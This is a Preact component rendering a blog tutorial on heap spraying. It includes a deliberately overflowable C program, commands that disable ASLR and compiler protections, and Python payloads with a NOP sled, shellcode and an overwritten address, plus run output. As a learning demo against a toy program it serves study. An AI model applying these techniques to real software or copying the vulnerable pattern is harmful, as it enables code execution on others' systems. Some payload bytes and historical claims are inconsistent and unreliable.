import { h, render, Component } from "preact";

class HeapSpray extends Component {
  render() {
    return (
      <article>
        <h1>Heap Spray</h1>
        <p>
          <em>
            I&rsquo;m new to programming in C and programming exploits. This is
            a documentation of my code, the assumptions I&rsquo;m making along
            the way, and the way I tackled problems I came across.
          </em>
        </p>
        <p>
          Heap spraying is a method of injecting shellcode onto the heap. It is
          not an exploit. It just provides some room for you to add some
          malicious code, which will be executed by using a <em>secondary</em>{" "}
          exploit. In my examples, I used a buffer overflow to simulate the
          secondary vector of attack.
        </p>
        <h2 id="tldr-just-give-me-the-code">TL;DR just give me the code</h2>
        <p>The code is right here:</p>
        <div class="highlight">
          <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
            <code class="program-languages" data-lang="c">
              {`
                #include <stdio.h>
                #include <stdlib.h>
                #include <string.h>

                int secure_method() {
                    printf("I did something.");
                    return 1;
                }

                int main(void) {
                    // user_input would be dynamically allocated on the heap at runtime
                    // but we can just hit the heap right away
                    char* simulated_user_input = malloc(1000000);

                    scanf("%s", simulated_user_input);

                    volatile int (*function_pointer)();
                    char buffer[64];
                    function_pointer = &secure_method;

                    printf("Simulated user input\t 0x%08x", simulated_user_input);
                    printf("Buffer for overflow\t\t 0x%08x", buffer);
                    // note if you want the address of this pointer you need &function_pointer,
                    // I forgot to change it in my tests so I'm leaving it so no one is confused
                    printf("Function pointer\t 0x%08x", function_pointer);

                    // corrupt the function pointer with the buffer overflow
                    scanf("%s", buffer);

                    printf("Corrupted function pointer\t 0x%08x", function_pointer);

                    // if function pointer exists, execute
                    if (function_pointer)
                    {
                        printf("Calling func pointer\t 0x%08x", function_pointer);
                        function_pointer();
                    }
                    return 0;
                }
            `}
            </code>
          </pre>
        </div>
        <p>
          <strong>Preparation instructions:</strong>
        </p>
        <ul>
          <li>
            Login as root <code>sudo su</code>
          </li>
          <li>
            <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>
          </li>
          <li>exit root</li>
        </ul>
        <p>
          <strong>Compile instructions:</strong>
        </p>
        <p>
          <code>
            $ gcc heap_spray_user_input.c -fno-stack-protector -z execstack -m32
            -g -o heap_spray_user_input
          </code>
        </p>
        <p>
          <strong>Run instructions:</strong>
        </p>
        <pre>
          <code>
            $ python -c
            print('\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x590\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffhello_friends\x0d\r\n'
            + ('A' * 64 + '\x60\xb1\x04\x08'))&quot; | ./heap_spray_user_input
          </code>
        </pre>
        <p>
          *You will likely need to change the final hex code{" "}
          <code>\x60\xb1\x04\x08</code> to be whatever your
          &ldquo;user_input&rdquo; address is. Notice the address is printing in
          reverse due to the endianess of my machine.
        </p>
        <h2 id="how-does-your-code-work">How does your code work?</h2>
        <ol>
          <li>
            We place shellcode on the heap
            <ul>
              <li>
                The first user input of our python script is the shellcode
              </li>
            </ul>
          </li>
          <li>
            We perform a buffer overflow on the buffer
            <ul>
              <li>
                The second input with the 64 &lsquo;A&rsquo;s is us filling up
                the buffer
              </li>
            </ul>
          </li>
          <li>
            The function pointer is corrupted by the buffer overflow and points
            to some address on the heap
            <ul>
              <li>
                The third input <code>\x60\xb1\x04\x08</code> is the address we
                want to &ldquo;overflow&rdquo; the buffer with
              </li>
            </ul>
          </li>
        </ol>
        <p>
          A buffer overflow exploits the way memory is allocated on the stack.
          As you assign variables in your program, they get added on the stack.
          Not all variables are allocated this way. Things like{" "}
          <code>malloc</code> will use the heap. But typically buffer overflow
          deals with the stack.
        </p>
        <p>This buffer is placed on the stack:</p>
        <pre>
          <code>char buffer[64];</code>
        </pre>
        <p>
          Lets pretend it has an address of <code>0xffc8c7d8</code>.
        </p>
        <p>The function pointer is also placed on the stack:</p>
        <pre>
          <code>volatile int (*function_pointer)();</code>
        </pre>
        <p>
          Lets pretend it has an address of <code>0xffc8c818</code>.
        </p>
        <p>
          See how the function pointer is adjacent to the buffer address? That
          means if we enter more than 64 values into the buffer, they&rsquo;ll
          start to overflow into the function pointer. That&rsquo;s why our
          Python code has this bit: <code>('A' * 64 + '\x10\x30\x41\xf7')</code>
          . Since our code doesn&rsquo;t check input size into our buffer, we
          can take advantage of a buffer overflow. We fill the buffer with 64
          &lsquo;A&rsquo;s and we tack on a little endian address. That will
          change our function pointer to point to that new address.
        </p>
        <p>
          Once we can control the function pointer, we now just want to point
          that pointer to the heap.
        </p>
        <h2 id="why-is-it-called-heap-spray">Why is it called heap spray?</h2>
        <p>
          Why do we call it heap <em>spray</em>? Because modern operating
          systems are aware of exploiting memory addresses. They are{" "}
          <em>really</em> aware of stack abuse. That&rsquo;s why when we compile
          the program for the demo, we use these flags:{" "}
          <code>-fno-stack-protector -z execstack -m32</code>. We turn off stack
          protection, turn on stack execution, and compile in 32 bit mode to
          simplify the address space. That makes my demo much easier to perform
          since it makes the buffer overflow possible. In the real world a lot
          of these flags would not be set if you wanted secure address spaces.
          But even with all of those flags on, our sample code will not work
          99.9999% of the time. Why? Because the stack isn&rsquo;t the only
          space that&rsquo;s protected. The heap is also randomized and if you
          want to change that you need to set this flag:
        </p>
        <p>
          <code>$ echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>
        </p>
        <p>
          Try recompiling and running the program a few times to check to see if
          the address of your malloc calls are not randomized. If they
          aren&rsquo;t you can turn it back on:
        </p>
        <p>
          <code>$ echo 2 &gt; /proc/sys/kernel/randomize_va_space</code>
        </p>
        <p>
          In the real world, we can&rsquo;t just turn off the security features
          for executing the stack and randomizing the address space. Lets ignore
          the gcc flags since those are related to the buffer overflow exploit.
          In theory any exploit would work and we are just using buffer overflow
          since it&rsquo;s the most common and the easiest to understand.
          Instead of dealing with the buffer overflow security features, lets
          focus on that <code>randomize_va_space</code>.
        </p>
        <h2 id="how-do-we-tackle-the-randomize_va_space">
          How do we tackle the randomize_va_space?
        </h2>
        <p>
          We <strong>spray</strong> our malicious code all over the heap.
          Instead of putting <em>just</em> the malicious shellcode onto the
          heap, we prepend <code>\x90</code> onto the front a lot of times.{" "}
          <code>\x90</code> is colloquially known as NOP. NOP (pronounced no-op)
          is the command in assembly for &ldquo;do nothing and continue
          on&rdquo;. Because we have that command, we can add millions of NOP
          codes onto the front of our malicious shellcode. Once we hit one of
          the NOP instructions, our program starts a &ldquo;NOP-sled&rdquo; down
          all of the NOP commands until it hits our malicious shellcode. By
          adding tons of NOPs onto the heap, we decrease the entropy of the
          randomized heap address space. So now we can &ldquo;guess&rdquo; the
          address space that should contain one of our NOP instructions.
          That&rsquo;s why our program <code>malloc</code> a large chunk of
          memory to the simulated user input. We&rsquo;re simulated a case where
          a user might request that much memory to store an object.
        </p>
        <p>
          In more complex programs (eg. a browser running JavaScript), the user
          input might be a string that is appended over and over again to cause
          it grow extremely large and then the actual meaningful shellcode is
          appended on the end. For that reason, browsers have to work really
          hard to ensure that memory allocations have unpredictable locations.
        </p>
        <p>
          This is how we append our NOPs:{" "}
          <code>print(('\x90' * 100000)...</code>
        </p>
        <h2 id="lets-try-it">Lets try it</h2>
        <p>
          This is me running the program with <code>randomize_va_space</code>{" "}
          turned on:
        </p>
        <pre>
          <code>
            <p>
              $ python -c &quot;print(('\x90' * 100000) +
              '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n'
              + ('A' * 64 + '\x10\x30\x41\xf7'))&quot; | ./heap_spray_user_input
            </p>
            <p>
              Simulated user input 0xf7379010 Buffer for overflow 0xffef6dc8
              Function pointer 0x080484e6 Corrupted function pointer 0xf7413010
              Calling func pointer 0xf7413010 Segmentation fault (core dumped)
            </p>
            <p> ATTEMPT 1: MISS;</p>
            <p>
              $ python -c &quot;print(('\x90' * 100000) +
              '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n'
              + ('A' * 64 + '\x10\x30\x41\xf7'))&quot; | ./heap_spray_user_input
            </p>
            <p>
              Simulated user input 0xf7416010 Buffer for overflow 0xffa3bcf8
              Function pointer 0x080484e6 Corrupted function pointer 0xf7413010
              Calling func pointer 0xf7413010 Segmentation fault (core dumped)
            </p>
            <p> ATTEMPT 2: MISS;</p>
            <p>
              $ python -c &quot;print(('\x90' * 100000) +
              '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n'
              + ('A' * 64 + '\x10\x30\x41\xf7'))&quot; | ./heap_spray_user_input
            </p>
            <p>
              Simulated user input 0xf7412010 Buffer for overflow 0xff832f18
              Function pointer 0x080484e6 Corrupted function pointer 0xf7413010
              Calling func pointer 0xf7413010
            </p>
            <p> HelloWorld</p>
            <p> ATTEMPT 3: HIT;</p>
          </code>
        </pre>
        <p>
          So, I used the same memory address which was a known &ldquo;hot
          zone&rdquo; in our heap for the simulated user input variable. I ran
          the program a few times and noticed that <code>\xf741xxxx</code> was a
          common address space for the variable. So, I picked one of the
          addresses I found <code>\x10\x30\x41\xf7</code> and I used that over
          and over. Eventually, we hit a NOP command and the NOP slide began.
          After we finished sliding, we hit my shellcode and began executing it
          (which just prints &ldquo;HelloWorld&rdquo;).
        </p>
        <h2 id="conclusions">Conclusions</h2>
        <p>
          The stack protection features on GCC and other compilers make
          exploiting things like Buffer Overflows and Heap Spray difficult.
          However, GCC does not have a lot of these security features on by
          default (unless you&rsquo;re in Linux). Spraying the heap is an
          interesting statistical exploit. Since we&rsquo;re attempting to
          reduce entropy, we sort of have to get lucky when we&rsquo;re
          executing my demo. It usually triggers 1/3 times. I am not sure if a
          typical heap spray attack is that unpredictable, but I imagine
          it&rsquo;s never 100% effective since there is always room to guess
          the wrong address.
        </p>
        <p>
          Heap sprays are responsible for ETERNAL BLUE and WannaCrypt attacks,
          which - to me - makes them a pretty powerful tool in the exploit belt.
          I <em>think</em> the reason you would use a heap spray is when you
          have access to the buffer overflow, but the buffer overflow exploit
          doesn&rsquo;t provide you with a vector to perfom the execution of
          malicious shellcode. If you have access to the heap (which many
          programs provide), then suddenly you have a new vector for creating
          any malicious code you want. Getting a shell becomes trivial in these
          scenarios.
        </p>
        <p>
          I&rsquo;m mostly posting this so that someone has access to functional
          C code that (vaguely) simulates a Heap Spray attack. I had a hell of a
          time finding a simple, reproduceable, example of a shellcode exploit
          and hopefully someone, someday, finds this useful.
        </p>
      </article>
    );
  }
}

export default HeapSpray;
